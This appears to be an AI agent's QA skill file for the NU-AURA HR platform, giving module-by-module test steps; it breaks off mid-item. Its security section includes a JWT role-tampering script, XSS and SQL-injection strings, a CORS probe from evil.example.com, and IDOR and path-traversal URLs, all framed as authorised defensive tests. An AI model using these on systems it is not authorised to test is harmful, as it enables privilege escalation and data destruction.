---
name: nu-aura-full-platform-qa
description: Use when asked to perform comprehensive, granular, or full QA testing of the NU-AURA platform — covering all sub-apps (NU-HRMS, NU-Hire, NU-Grow, NU-Fluence), all 9 roles, all CRUD flows, RBAC boundaries, form validations, loading/error/empty states, and UI/UX checks. Produces an Excel bug report.
---

# NU-AURA Complete Platform QA Skill

## Platform Map

| Sub-App | Routes | Status |
|---|---|---|
| **NU-HRMS** | /me · /dashboard · /employees · /departments · /attendance · /leave · /payroll · /compensation · /benefits · /expenses · /loans · /travel · /assets · /letters · /statutory · /tax · /helpdesk · /approvals · /announcements · /org-chart · /timesheets · /time-tracking · /projects · /resources · /allocations · /calendar · /nu-calendar · /nu-drive · /nu-mail · /reports · /analytics · /settings · /admin · /overtime · /probation · /referrals · /shifts | ~95% built |
| **NU-Hire** | /recruitment · /onboarding · /preboarding · /offboarding · /offer-portal · /careers | ~92% built |
| **NU-Grow** | /performance · /okr · /feedback360 · /training · /learning · /recognition · /surveys · /wellness | ~90% built |
| **NU-Fluence** | /fluence/wiki · /fluence/blogs · /fluence/templates · /fluence/drive · /fluence/search · /fluence/my-content · /fluence/wall · /fluence/dashboard | Phase 2 — routes defined, UI not started |

**Routes source of truth:** `frontend/lib/config/apps.ts` → `PLATFORM_APPS → routePrefixes`
**Total page routes:** 249 `page.tsx` files across 4 sub-apps

## Role Matrix

| Code | Role | Default Scope |
|---|---|---|
| ESS | Employee Self-Service | Own data only |
| MGR | Reporting Manager | Own team |
| HRA | HR Admin | All employees |
| REC | Recruiter | Hire module only |
| PAY | Payroll Admin | Payroll/compensation |
| FIN | Finance Approver | Approval flows |
| ITA | IT / Asset Admin | Asset module |
| SYS | SuperAdmin | Full platform — bypasses ALL RBAC + feature flags |
| UNA | No session | Blocked everywhere → /auth/login |

**Critical rules:**

- SYS bypasses ALL 4 layers: `@RequiresPermission` (PermissionAspect.java), `@RequiresFeature` (FeatureFlagAspect.java), frontend `usePermissions`, and `middleware.ts` — never block them anywhere
- Every user is also an employee — MY SPACE sidebar items (`/me/*`) have no `requiredPermission` and must always be accessible to all authenticated users
- Roles are additive, not exclusive — HR Managers, CEOs, Team Leads all see MY SPACE pages plus their admin pages
- **Permission normalization:** DB stores `employee.read`, code uses `EMPLOYEE:READ` — normalized in `JwtAuthenticationFilter`. When checking permission behavior, treat both formats as the same permission
- **Permission hierarchy:** `MODULE:MANAGE` implies all sub-permissions; `VIEW_ALL` > `VIEW_TEAM` > `VIEW_SELF`. Test that higher grants are not accidentally blocked
- **JWT contains roles only** (not permissions) — permissions loaded from Redis cache via `SecurityService.getCachedPermissions()`. A Redis flush may cause permission reload latency

---

## GLOBAL PRE-FLIGHT (Run Once Before Any Loop)

```bash
# Verify services
curl -s http://localhost:3000 | grep -c "html"        # > 0
curl -s http://localhost:8080/actuator/health          # {"status":"UP"}

# Create output directories
mkdir -p /Users/fayaz.m/IdeaProjects/nulogic/nu-aura/qa-reports/screenshots
mkdir -p /Users/fayaz.m/IdeaProjects/nulogic/nu-aura/qa-reports/gifs

# If services not running:
cd /Users/fayaz.m/IdeaProjects/nulogic/nu-aura
docker-compose up -d
cd backend && ./start-backend.sh &
cd frontend && npm run dev &
# Poll max 60s until healthy
```

**Auth rate limiting:** `/api/v1/auth/**` is capped at 5 req/min. Space out role-switching tests by 15s or use a single SYS session for initial smoke tests before cycling roles.

**Demo tenant:** `tenant_id = 660e8400-e29b-41d4-a716-446655440001`. Feature flags `enable_payroll`, `enable_performance`, `enable_documents`, `enable_helpdesk`, `enable_lms`, `enable_wellness`, `enable_projects`, `enable_timesheets`, `enable_fluence`, `enable_google_drive`, `enable_payments`, `enable_ai_recruitment` are all seeded as enabled. A 403 from a feature-flag check on any of these flags = bug.

**Login sequence (per role):**

```
navigate  → localhost:3000/auth/login
fill      → credentials from .env / start-backend.sh
assert    → dashboard loads, user name/role shown in header
```

---

## PER-MODULE STANDARD CHECKS (Apply to EVERY module below)

> Run these for every page tested. Do not skip.

### A. State Checks
```
LOADING:      SkeletonTable / SkeletonCard / SkeletonStatCard shown (never plain spinner or "Loading..." text)
              assert → skeleton matches final layout shape (not generic rectangle)
              assert → skeleton shimmer animation is smooth (not jittery or frozen)
              assert → content replaces skeleton without layout shift (CLS = 0)
EMPTY:        <EmptyState> component with icon + title + description + action (never blank page/card)
              assert → action button present (e.g., "Add Employee", "Create Leave Request")
              assert → action button navigates to correct creation flow
              assert → empty state illustration/icon matches module context
ERROR:        API 500 → error UI shown (never white screen or blank card)
              assert → error message is user-friendly (not raw stack trace or JSON)
              assert → "Retry" button present and functional (re-fetches data on click)
              404 → /route/nonexistent-id → "not found" state rendered
              assert → "Go Back" or "Home" navigation link present
              Network disconnect → "No connection" banner/toast (not silent failure)
STALE:        navigate away and back → data refreshes (React Query staleTime respected)
              browser tab hidden 5+ min → return → data auto-refetches
              mutate data in tab A → tab B reflects change on focus (if using React Query refetchOnWindowFocus)
```

### B. UI / Visual Validation
```
DARK MODE:    toggle .dark → all text readable, no white-on-white, no hardcoded bg
              assert → no hardcoded hex colors (grep for #fff, #000, #333, rgb() in rendered styles)
              assert → borders visible in dark mode (not invisible gray-on-gray)
              assert → form input backgrounds contrast with card backgrounds
              assert → modal/dialog overlays are semi-transparent dark, not opaque white
              assert → chart colors adapt (Recharts: no hardcoded fill="#xxx")
              assert → shadows adapt (not light shadows on dark bg)
              assert → images with white backgrounds have border or rounded mask
              assert → status badges readable (green/red on dark bg)
RESPONSIVE:   1280×900 (desktop) → 768×1024 (tablet) → 375×812 (mobile) → no overflow, tap targets ≥ 44px
              assert → no horizontal scrollbar on body at any breakpoint
              assert → tables switch to card layout or horizontal scroll on mobile
              assert → modals/dialogs don't overflow viewport on mobile
              assert → sidebar fully collapses on mobile (hamburger menu)
              assert → form inputs are full-width on mobile (not truncated)
              assert → date pickers and dropdowns don't clip off-screen
              assert → multi-column layouts stack vertically on mobile
              assert → font sizes readable at 375px (min 14px body text)
              assert → touch targets have 8px+ spacing between them (no accidental taps)
TYPOGRAPHY:   assert → IBM Plex Sans loaded (not fallback serif/sans-serif)
              assert → heading hierarchy: h1 > h2 > h3 (no skipped levels)
              assert → no text truncation without tooltip on hover
              assert → long employee names / department names wrap or ellipsis correctly
              assert → numbers right-aligned in table columns
              assert → dates in consistent format across the page (DD MMM YYYY or relative)
SPACING:      assert → 8px grid spacing throughout (banned: gap-3 p-3 p-5 m-3)
              assert → consistent padding inside cards (p-4 or p-6)
              assert → no visual "cramping" — content has breathing room
              assert → section headers have consistent margin-bottom
COLORS:       assert → Sky palette used for primary (NOT purple, NOT blue-600)
              assert → focus rings: ring-sky-700 (NOT ring-primary-*)
              assert → success: green, warning: amber/yellow, error: red, info: sky
              assert → status badges use semantic colors consistently
              assert → no color-only indicators (always paired with icon or text)
ANIMATION:    assert → page transitions smooth (Framer Motion, not jumpy)
              assert → hover states on buttons have transition (transition-colors)
              assert → no animation on prefers-reduced-motion: reduce
              assert → loading spinners in buttons during async actions
              assert → toast notifications slide in/out (not appear/disappear abruptly)
ICONS:        assert → consistent icon library (Lucide React + Tabler Icons)
              assert → icon-only buttons have aria-label
              assert → icons sized consistently (16px inline, 20px buttons, 24px headers)
              assert → no broken/missing icons (□ or ? placeholder)
```

### C. Accessibility (Deep)
```
A11Y:         axe.run() → 0 critical violations; Tab order logical; labels on inputs; focus rings visible
              assert → all images have meaningful alt text (not "image" or "photo")
              assert → decorative images have alt="" or role="presentation"
              assert → form validation errors announced to screen readers (role="alert" or aria-live)
              assert → modals trap focus (Tab doesn't leave modal)
              assert → modal closes on Escape key
              assert → dropdown menus navigable with arrow keys
              assert → tables have <th> with scope="col" or scope="row"
              assert → color contrast ratio ≥ 4.5:1 for text, ≥ 3:1 for large text (WCAG AA)
              assert → skip navigation link present ("Skip to main content")
              assert → page title updates on route change (<title> or document.title)
              assert → aria-current="page" on active sidebar item
              assert → loading states announced (aria-busy="true" on container)
              assert → toast notifications have role="status" or role="alert"
              assert → drag-and-drop has keyboard alternative (e.g., reorder buttons)
KEYBOARD:     assert → Tab: moves forward through interactive elements
              assert → Shift+Tab: moves backward
              assert → Enter: activates buttons, links, submits forms
              assert → Space: toggles checkboxes, activates buttons
              assert → Escape: closes modals, dropdowns, popovers
              assert → Arrow keys: navigate within menus, tabs, radio groups
              assert → Home/End: jump to first/last item in lists
              assert → no focus traps (except modals) — user can always Tab out
SCREEN-READ:  assert → heading structure creates meaningful outline (check with h1-h6 scan)
              assert → landmark regions present (<main>, <nav>, <aside>, <header>)
              assert → dynamic content changes announced (aria-live regions)
              assert → form field errors associated via aria-describedby
```

### D. Console & Network
```
CONSOLE:      0 unresolved JS errors after every action
              assert → no React key warnings ("Each child in a list should have a unique key")
              assert → no React hook order warnings
              assert → no deprecated API warnings from libraries
              assert → no "Failed to load resource" errors
              assert → no CORS errors
              assert → no memory leak warnings (if available)
NETWORK:      0 unresolved 4xx/5xx; no missing auth headers; no cross-tenant data in response
              assert → all API calls include Authorization cookie or header
              assert → CSRF token sent on all mutation requests (POST/PUT/PATCH/DELETE)
              assert → Content-Type: application/json on all API responses (not text/html)
              assert → no duplicate API calls for the same data on page load
              assert → API responses < 3000ms (flag anything slower as Performance bug)
              assert → response payloads don't contain unnecessary fields (no password hashes, internal IDs leaked)
              assert → pagination params sent correctly (?page=0&size=20)
              assert → no API calls to undefined/null endpoints (e.g., /api/v1/undefined)
UNA:          navigate directly via URL without session → redirected to /auth/login (every protected route)
              assert → redirect URL preserved: /auth/login?redirect=[original-route]
              assert → after login, user is sent back to the original route
DOUBLE-CLICK: rapid double-submit on any create/submit button → exactly 1 record created
              assert → button shows loading spinner/disabled state during submission
              assert → form cannot be re-submitted while request is in-flight
```

### E. Data Integrity
```
DATA FORMAT:  assert → dates never shown as raw ISO (2026-04-02T00:00:00Z) — always formatted
              assert → currency amounts have comma separators and ₹/$ symbol
              assert → no "NaN", "undefined", "null", "[object Object]" rendered as text
              assert → phone numbers formatted consistently
              assert → email addresses are lowercase
              assert → employee IDs follow consistent format (EMP-XXXX or similar)
              assert → percentages show % symbol and 0–100 range (not 0–1 decimal)
PAGINATION:   assert → total count matches header label ("Showing 1–20 of 156")
              assert → last page shows correct remaining count (not phantom empty rows)
              assert → page 1 and page 2 show different records (not same data repeated)
              assert → changing page size resets to page 1
              assert → going beyond max page → shows last page or empty (not error)
SORTING:      assert → default sort order is consistent (typically createdAt DESC)
              assert → sort indicator (▲/▼) visible on active column
              assert → sort persists across pagination (page 2 maintains sort)
              assert → sort works with special characters and unicode names
FILTERING:    assert → filters are additive (Department + Status applied together)
              assert → filter count badge shows active filter count
              assert → "Clear All" resets all filters and shows full dataset
              assert → filtered export matches filtered view (not full dataset)
              assert → filter persists on back navigation (browser back button)
SEARCH:       assert → debounced search (not firing on every keystroke — check network)
              assert → minimum 2–3 character trigger
              assert → search highlights matching text in results
              assert → clear search (X button) restores full list
              assert → search across multiple fields (name, email, ID)
```

### F. Performance Checks
```
PERF:         assert → First Contentful Paint < 2s on page load
              assert → Largest Contentful Paint < 4s
              assert → no janky scrolling (60fps on table scroll)
              assert → lazy-loaded images use loading="lazy" or Intersection Observer
              assert → lists with 100+ items use virtualization (react-window or similar)
              assert → no unnecessary re-renders (check React DevTools profiler count)
              assert → bundle chunk loaded per route (not entire app on first load)
MEMORY:       assert → navigate between 10 pages rapidly → no memory growth > 50MB
              assert → open and close 20 modals → memory returns to baseline
              assert → scroll long lists → no DOM node count explosion
```

---

**After every page action:**

```
read_console_messages(onlyErrors: true, clear: true)
read_network_requests(urlPattern: '/api/', clear: true)
→ log all 4xx/5xx, missing auth headers, responses > 3000ms
→ Content-Type: text/html on /api/ endpoint = server 500
```

---

## MODULE 1 — AUTH (/auth/login, /auth/forgot-password, /auth/mfa, /auth/saml)

### 1.1 Login Page Load

```
navigate  → localhost:3000/auth/login
assert    → Login form visible (email + password + Sign In button)
assert    → NuLogic logo present
assert    → "Sign in with Google" button visible
assert    → No console errors on load
screenshot → auth-login-page.png
```

### 1.2 Happy Path Login (all 9 roles)

For each role:

```
fill      → correct credentials
click     → Sign In
assert    → redirected to /dashboard (or role-specific landing)
assert    → header shows correct name and role label
assert    → sidebar shows modules accessible to this role
screenshot → auth-login-[role].png
read_network_requests → POST /api/v*/auth/login → 200
assert    → response contains access_token, refresh_token
assert    → httpOnly cookie set (check Set-Cookie header: HttpOnly flag)
assert    → CSRF double-submit cookie present in response headers
```

### 1.3 Invalid Credentials

```
fill      → email: valid, password: wrong
click     → Sign In
assert    → error message shown ("Invalid credentials" or similar)
assert    → NOT redirected away from login
assert    → NO session cookie created
screenshot → auth-invalid-creds.png
```

### 1.4 Rate Limiting — Auth Endpoint

```
POST /api/v*/auth/login with wrong password × 6 in quick succession
assert    → 6th attempt returns 429 Too Many Requests
assert    → lockout error message shown to user
read_network_requests → confirm 429 on 6th attempt
screenshot → auth-rate-limit.png
Note: wait 60s after this test before next role login
```

### 1.5 Empty Form Submission

```
click     → Sign In without filling anything
assert    → validation error on email field
assert    → validation error on password field
assert    → form does NOT submit
```

### 1.6 Invalid Email Format

```
fill      → email: "notanemail"
click     → Sign In
assert    → "Please enter a valid email" error
```

### 1.7 Google OAuth Flow

```
click     → "Sign in with Google"
assert    → Google OAuth popup/redirect initiated
read_network_requests → GET /api/v*/auth/google or /oauth2/authorization/google
Note: full OAuth flow requires real Google account; verify redirect initiation only
assert    → no console error on button click
screenshot → auth-google-oauth.png
```

### 1.8 MFA Login Flow

```
# MFA login uses a separate pre-auth endpoint
navigate  → localhost:3000/auth/login
fill      → MFA-enabled user credentials → Submit
assert    → redirected to MFA verification step (OTP input shown)
read_network_requests → POST /api/v1/auth/mfa-login → 200 (this endpoint is public/pre-auth)
fill      → valid OTP code → Submit
assert    → full session established, redirected to dashboard
Test invalid OTP:
fill      → "000000" → Submit
assert    → "Invalid OTP" error, no session created
screenshot → auth-mfa-flow.png
```

### 1.9 SAML Login (if IdP configured — V84)

```
navigate  → localhost:3000/auth/login
assert    → SSO/SAML login option visible (if SAML IdP configured)
read_network_requests → GET /api/v*/auth/saml/login or /saml/initiate
assert    → redirect to IdP URL initiated
screenshot → auth-saml-option.png
```

### 1.10 Password Policy Enforcement

```
# Test during password change / reset flow
attempt password: "short1!"
assert    → "Password must be at least 12 characters"
attempt password: "alllowercase123!"
assert    → "Password must contain uppercase letter"
attempt password: "ALLUPPERCASE123!"
assert    → "Password must contain lowercase letter"
attempt password: "NoSpecialChar12"
assert    → "Password must contain special character"
attempt password: same as last 5 passwords
assert    → "Cannot reuse last 5 passwords"
Note: 90-day max age policy — test warning if password nearing expiry
screenshot → password-policy-errors.png
```

### 1.11 Session Restore

```
login as SYS → close tab → new tab → localhost:3000/dashboard
assert    → still authenticated (no redirect to login)
```

### 1.12 Logout

```
click     → user avatar (top right)
click     → Logout
assert    → redirected to /auth/login
assert    → browser back → still on login (session cleared)
assert    → localStorage/sessionStorage tokens cleared
read_network_requests → POST /api/v*/auth/logout → 200
```

### 1.13 Unauthorized Route Access (UNA)

For all protected routes in the platform:

```
without any session:
navigate  → [route]
assert    → redirected to /auth/login
assert    → return URL preserved: /auth/login?redirect=[route]
assert    → NEVER shows any data
```

### 1.14 Token Expiry Simulation

```
javascript_tool: localStorage.removeItem('auth_token')
navigate  → /employees
assert    → redirected to /auth/login with redirect param
```

### 1.15 Forgot Password

```
click     → "Forgot password?" link
assert    → navigates to /auth/forgot-password
fill      → registered email
click     → Submit
assert    → success message ("Check your email")
assert    → no 500 error
```

### 1.16 RBAC — Wrong Role Route Access

```
login as ESS → navigate directly to /admin → 403 or redirect
login as REC → navigate directly to /payroll → 403 or redirect
login as ESS → navigate directly to /employees/[ANOTHER_ID] → 403 or redirect
assert    → NEVER blank white page on block
```

### 1.17 OWASP Security Headers

```
read_network_requests → any /api/ response headers
assert    → X-Content-Type-Options: nosniff
assert    → X-Frame-Options: DENY or SAMEORIGIN
assert    → Strict-Transport-Security present
assert    → Content-Security-Policy present
assert    → X-XSS-Protection or CSP equivalent present
screenshot → security-headers.png
```

### 1.18 CORS Validation

```
javascript_tool:
  fetch('http://localhost:8080/api/v1/employees', {
    method: 'GET',
    headers: { 'Origin': 'http://evil.example.com' }
  }).then(r => console.log('CORS status:', r.status))
assert    → request fails or returns 403 (no Access-Control-Allow-Origin for foreign origin)
read_console_messages → no CORS success from unauthorized origin
```

### 1.19 JWT Token Tampering

```
# Modify JWT payload (change role from ESS to SYS)
javascript_tool:
  const token = document.cookie.match(/access_token=([^;]+)/)?.[1];
  if (token) {
    const parts = token.split('.');
    const payload = JSON.parse(atob(parts[1]));
    console.log('Original roles:', payload.roles);
    // Tamper: modify payload
    payload.roles = ['SUPER_ADMIN'];
    parts[1] = btoa(JSON.stringify(payload));
    document.cookie = `access_token=${parts.join('.')}; path=/`;
  }
navigate  → /admin
assert    → 401 or 403 (signature verification rejects tampered JWT)
assert    → NEVER grants elevated access from tampered token
screenshot → jwt-tamper-blocked.png
```

### 1.20 Concurrent Session Handling

```
login as SYS in Browser A → note session
login as SYS in Browser B (same account, different browser/incognito)
assert    → both sessions active OR first session invalidated (per policy)
assert    → if single-session policy: Browser A gets "Session expired" on next action
assert    → no session data corruption between concurrent sessions
```

### 1.21 XSS via Login Form

```
fill      → email: "<script>alert('xss')</script>@test.com"
fill      → password: "';DROP TABLE users;--"
click     → Sign In
assert    → input sanitized, no script execution
assert    → error message does NOT reflect raw input (no reflected XSS)
assert    → SQL injection string treated as literal text
read_console_messages → no "alert" or script execution
screenshot → xss-login-attempt.png
```

### 1.22 Auth Cookie Security Attributes

```
javascript_tool:
  // Check cookie flags
  const cookies = document.cookie;
  console.log('Cookies visible to JS:', cookies);
  // httpOnly cookies should NOT be visible to JavaScript
read_network_requests → check Set-Cookie header on login response:
  assert → HttpOnly flag present (cookie NOT accessible via document.cookie)
  assert → Secure flag present (cookie sent only over HTTPS — may be absent on localhost)
  assert → SameSite=Strict or SameSite=Lax (prevents CSRF via cross-site requests)
  assert → Path=/ (not overly broad)
  assert → cookie size < 4096 bytes (CRIT-001: roles only, no permissions)
screenshot → auth-cookie-flags.png
```

### 1.23 Refresh Token Flow

```
# Wait for access token to near expiry (or simulate short TTL)
javascript_tool:
  // Force access token expiry
  const token = document.cookie.match(/access_token=([^;]+)/)?.[1];
  if (token) {
    const payload = JSON.parse(atob(token.split('.')[1]));
    console.log('Token exp:', new Date(payload.exp * 1000));
  }
# Perform an action that triggers token refresh
navigate  → /employees
read_network_requests:
  assert → POST /api/v*/auth/refresh → 200 (silent refresh happened)
  assert → new access_token issued in Set-Cookie
  assert → page loads normally (no redirect to login)
  assert → old refresh_token invalidated (one-time use)
```

### 1.24 Account Lockout After Failed Attempts

```
fill wrong password × 5 for same account (within rate limit window)
assert    → account locked after 5 failures (if lockout policy exists)
assert    → "Account locked. Try again in X minutes" message
assert    → correct password during lockout → still blocked
wait lockout duration → correct password → login succeeds
screenshot → account-lockout.png
```

### 1.25 Login Page UI Deep Validation

```
navigate  → /auth/login
assert    → form centered vertically and horizontally
assert    → email field has autocomplete="email"
assert    → password field has autocomplete="current-password" and type="password"
assert    → password visibility toggle (eye icon) works
assert    → Tab order: Email → Password → Sign In → Forgot Password → Google OAuth
assert    → Enter key submits form from any field
assert    → form width consistent at 375px, 768px, 1280px
assert    → NuLogic logo links to home or is static (not broken image)
assert    → no console errors on initial load
assert    → page title is "Sign In | NU-AURA" or similar (not "React App")
screenshot → auth-login-ui-deep.png
```

---

## MODULE 2 — MY SPACE SELF-SERVICE (/me/*)

**Rule:** ALL /me/* routes must be accessible to every authenticated user regardless of role. Never gate these. File Critical bug if any role is blocked.

### 2.1 My Profile (/me/profile or /me)

```
navigate  → /me (or /me/profile)
assert    → avatar, full name, designation, department, email, phone, join date
assert    → profile tabs: Personal Info, Employment, Bank Details, Documents
click each tab → content loads or EmptyState (not blank), 0 console errors
Edit own profile: click Edit → change phone → Save → change persists, success toast
screenshot → my-profile.png
```

### 2.2 My Payslips (/me/payslips)

```
navigate  → /me/payslips
assert    → list of payslips by month/year
click payslip → detail: earnings / deductions / net pay / employer contributions
assert    → amounts formatted (currency, commas), no NaN/undefined
Download PDF → file opens, correct data
screenshot → my-payslips.png
```

### 2.3 My Leave (/me/leave)

```
navigate  → /me/leave
assert    → balances shown, Apply Leave button present
apply leave for self → standard leave flow (see Module 6)
assert    → ESS sees only own requests, not colleagues'
```

### 2.4 My Attendance (/me/attendance)

```
navigate  → /me/attendance
assert    → own clock-in/out records, date range filter works
Request Correction flow (see Module 5.4)
```

### 2.5 My Assets (/me/assets)

```
navigate  → /me/assets
assert    → only assets assigned to self
assert    → cannot create/assign assets from this view
```

### 2.6 My Loans / Expenses / Travel

```
/me/loans    → own loan applications and EMI schedule
/me/expenses → own expense claims
/me/travel   → own travel requests
All: EmptyState if no data, not blank
```

---

## MODULE 3 — MY DASHBOARD (/dashboard)

### 3.1 Page Load

```
navigate  → /dashboard
assert    → greeting: "Good [morning/afternoon/evening], [Name]"
assert    → role label below name (e.g., "Chief Executive Officer · Administration")
assert    → today's date shown correctly
assert    → live clock ticking (HH:MM:SS)
assert    → all skeleton loaders resolve within 5s
assert    → 0 console errors
screenshot → dashboard-loaded.png
```

### 3.2 Quick Access Widget

```
assert    → "All caught up" when 0 pending actions
assert    → Inbox link present → click → navigates correctly
If pending: action items listed with count badge
click     → each action item → navigates to correct module
```

### 3.3 Clock In / Clock Out

```
assert    → "Clock In" button visible (not clocked in yet)
gif_creator → start_recording
click     → Clock In
assert    → button changes to "Clock Out"
assert    → success toast shown
assert    → clock-in timestamp displayed
gif_creator → stop + export → gifs/clock-in.gif
read_network_requests → POST /api/v*/attendance/clock-in → 201

click     → Clock Out
assert    → button reverts to "Clock In"
assert    → "Worked X hrs Y mins" shown
assert    → success toast
read_network_requests → POST /api/v*/attendance/clock-out → 200
```

### 3.4 Rapid Double-Click Clock In (deduplication)

```
double_click → Clock In rapidly
assert    → only ONE attendance record created
read_network_requests → confirm only 1 POST /clock-in
```

### 3.5 Real-Time Notifications (WebSocket/STOMP)

```
javascript_tool:
  // Verify WebSocket connection established
  const ws = window._stompClient || window._socket;
  console.log('WS connected:', ws && ws.connected);
assert    → STOMP/WebSocket connection active on dashboard
Trigger a notification-generating event in another tab (e.g., approve a leave request)
assert    → notification bell badge increments without page refresh
assert    → notification appears in panel in real-time
screenshot → realtime-notification.png
```

### 3.6 Holidays Widget

```
assert    → next holiday: name, date, "in X days", type badge (NATIONAL/OPTIONAL/RESTRICTED)
assert    → restricted holidays (V85) shown with distinct badge
click     → ▶ / ◀ arrows → holiday cycles correctly
click     → View All → navigates to /calendar or /holidays
assert    → no crash when only 1 holiday
screenshot → holidays-widget.png
```

### 3.7 On Leave / Working Remotely Widgets

```
On Leave Today: "Everyone is working today!" OR employee names with leave type — NEVER blank
Working Remotely: "No one is working remotely" OR employee names — NEVER blank
screenshot → leave-remote-widgets.png
```

### 3.8 Leave Balance Widget

```
assert    → ring/donut chart renders (not broken/empty)
assert    → center: days number + "DAYS LEFT" label
assert    → "X used · Y total" shown
assert    → no "NaN", "undefined", raw ISO dates
click     → ◀ ▶ arrows → other leave types cycle, chart + numbers update
click     → "Request Leave" → leave form/modal opens
click     → View All Balances → navigates to /leave
screenshot → leave-balance-widget.png
```

### 3.9 Company Feed — Post / Poll / Praise

For each content type (Post, Poll, Praise):

```
click     → tab → fill form → Submit
assert    → appears in feed immediately (author, timestamp, content)
assert    → no duplicate on double-click submit
read_network_requests → POST /api/v*/posts (or /polls, /praise) → 201
Edit: 3-dot menu → Edit → pre-populated → save → updates
Delete: 3-dot menu → Delete → confirm dialog → removed → success toast
screenshot → feed-[type]-crud.png
```

### 3.10 Feed Filter Tabs

For each: All | Announcements | Birthdays | Anniversaries | New Joiners | Recognition | LinkedIn | Posts:

```
click     → tab
assert    → content filters to that type only
assert    → EmptyState component if no content (not blank)
assert    → tab badge count matches actual items
```

### 3.11 Birthdays / Anniversaries / New Joiners

```
Birthdays:    shown OR "No upcoming birthdays" — never blank, never raw ISO date
Anniversaries: name + "X years" milestone, year count correct from hire date
New Joiners:  name, role, formatted join date
screenshot → dashboard-right-panels.png
```

### 3.12 RBAC — Dashboard Scope

```
ESS  → sees own data only in widgets
MGR  → sees team-scoped leave/attendance
HRA  → sees all employees
SYS  → sees everything
screenshot per role → verify no cross-scope leakage
```

---

## MODULE 4 — EMPLOYEES (/employees, /employees/[id])

### 4.1 Employee List — Load

```
navigate  → /employees
assert    → table renders: Name, Employee ID, Department, Designation, Status, Actions
assert    → SkeletonTable shown while loading (NOT plain spinner)
assert    → pagination controls visible
screenshot → employees-list.png
```

### 4.2 Search, Filter, Sort

```
type      → partial name → results filter correctly
no match  → EmptyState component (not blank)
filter    → Department → only that dept shown
filter    → Status: Active → only active
clear all → full list restored
sort      → Name (A-Z, Z-A), Department, Join Date → rows reorder correctly
```

### 4.3 Pagination & Page Size

```
Page 2 → different employees, indicator updates
Last page → First page → data correct
rows per page: 10 / 25 / 50 → correct count shown
```

### 4.4 Export

```
click     → Export (CSV/Excel)
assert    → file downloads, correct columns and data, no empty file
```

### 4.5 Create Employee

```
click     → Add Employee / "+"
fill      → First Name: "QA", Last Name: "TestEmployee",
            Email: "qa.test.[timestamp]@nulogic.com",
            Department, Designation, Join Date, Employment Type: Full-time
click     → Save / Create
assert    → success toast: "Employee created"
assert    → employee in list, ID auto-generated
read_network_requests → POST /api/v*/employees → 201
screenshot → employee-create-success.png
```

### 4.6 Create Employee — Validation

```
submit empty form → per-field errors on required fields
duplicate email   → "Email already exists" error
invalid email     → field-level error
assert            → form does NOT submit on any failure
```

### 4.7 Employee Profile — View

```
click     → employee row → /employees/[id]
assert    → avatar, full name, employee ID, designation, department, email,
            phone, join date (formatted), employment type badge, status badge
assert    → profile tabs visible (Personal, Employment, Documents, etc.)
screenshot → employee-profile.png
```

### 4.8 Employee Profile — Edit

```
click     → Edit → form opens pre-populated
change    → phone number → Save
assert    → profile updates + success toast
hard refresh → change persists

Edit → invalid email format → validation error, cannot save
Edit → Cancel → no changes saved
screenshot → employee-edit.png
```

### 4.9 Employee Profile — Tabs

For each tab (Personal, Employment, Bank Details, Documents, Leave, Attendance, Assets, etc.):

```
click     → tab
assert    → content loads OR EmptyState (not blank), 0 console errors
screenshot → employee-tab-[name].png
```

### 4.10 Field-Level Access — Salary Visibility

```
login as MGR → open team member profile → Employment tab
assert    → salary/compensation VISIBLE (manager scope)
login as ESS → navigate to /employees/[PEER_ID]/profile
assert    → salary fields hidden or 403 (peers should NOT see each other's salary)
login as PAY → open any employee profile
assert    → salary details visible (payroll admin scope)
screenshot → employee-salary-visibility.png
```

### 4.11 Probation Management (/probation — V83)

```
navigate  → /probation
assert    → employees on probation listed with probation end date
click employee → probation detail: start date, end date, review notes
Confirm Completion: mark probation completed → status update → employee active
Extend: change end date + reason → save
RBAC: HRA/SYS full access; MGR read own team; ESS/others → 403
screenshot → probation-list.png
```

### 4.12 Deactivate / Terminate

```
click     → Deactivate → confirm dialog with employee name
Cancel    → status unchanged
Confirm   → status badge: "Inactive", employee still in list
assert    → terminated employee cannot log in
screenshot → employee-deactivated.png
```

### 4.13 RBAC — Employees

```
SYS, HRA → full access (list, view, create, edit, deactivate)
MGR      → view own team; cannot create/delete
ESS      → /employees → redirected or sees only own profile
REC, PAY, ITA → /employees → 403 or redirect

ESS: /employees/[OTHER_EMPLOYEE_ID] → 403 or redirect
Cross-tenant: /employees/[TENANT_B_ID] → 404 or 403, NEVER returns foreign data
```

### 4.14 Bulk Operations

```
select    → multiple employees via checkbox
Bulk actions: change status, assign department, export selected
assert    → bulk action applies to ALL selected (not just first)
assert    → success toast shows count: "5 employees updated"
assert    → select all (checkbox in header) → selects current page only (not all pages)
assert    → deselect → count clears
RBAC: only HRA/SYS see bulk action controls; MGR/ESS → no checkboxes visible
screenshot → employees-bulk-actions.png
```

### 4.15 Employee Profile — Document Upload

```
navigate  → /employees/[id] → Documents tab
Upload:   click Upload → select PDF (< 5MB) → upload completes with progress bar
assert    → document listed with filename, upload date, file size, type icon
assert    → click document → downloads or previews correctly
assert    → upload 10MB+ file → size limit error (if configured)
assert    → upload .exe file → file type rejected (security)
assert    → upload with special chars in filename → sanitized, no 500
Delete:   confirm dialog → document removed
RBAC: ESS can upload own docs; HRA/SYS can upload for any employee; MGR read-only
screenshot → employee-docs-upload.png
```

### 4.16 Employee Profile — Inline Edit Validation

```
navigate  → /employees/[id] → Personal Info tab
Edit phone: enter letters "abc" → validation error (numbers only)
Edit email: enter "not-an-email" → validation error
Edit date of birth: enter future date → validation error
Edit employee ID: field should be read-only (auto-generated)
Edit join date: change to future date → allowed (pre-onboarding)
Edit join date: change to date before DOB → validation error
Edit name: enter "   " (spaces only) → validation error (cannot be blank)
Edit name: enter name with 200+ characters → max length validation
assert    → unsaved changes warning on navigate away (beforeunload or route guard)
```

### 4.17 Employee List — URL Parameter Manipulation (IDOR)

```
# Insecure Direct Object Reference testing
login as ESS (employee A)
note own employee ID: /employees/[OWN_ID] → accessible
manipulate URL: /employees/[OTHER_ESS_ID] → 403 or redirect (not accessible)
manipulate URL: /employees/99999999 → 404 "Employee not found" (not stack trace)
manipulate URL: /employees/-1 → 404 or 400 (not 500)
manipulate URL: /employees/abc → 404 or 400 (not 500)
manipulate URL: /employees/../../admin → 404 (path traversal blocked)

# API-level IDOR
read_network_requests:
  GET /api/v1/employees/[OTHER_ID] → 403 (not 200 with data)
  PUT /api/v1/employees/[OTHER_ID] → 403 (cannot edit others)
  DELETE /api/v1/employees/[OTHER_ID] → 403 (cannot delete others)
screenshot → idor-employees.png
```

### 4.18 Employee Create — Boundary Testing

```
# Field boundary tests
First Name: 1 character "A" → allowed
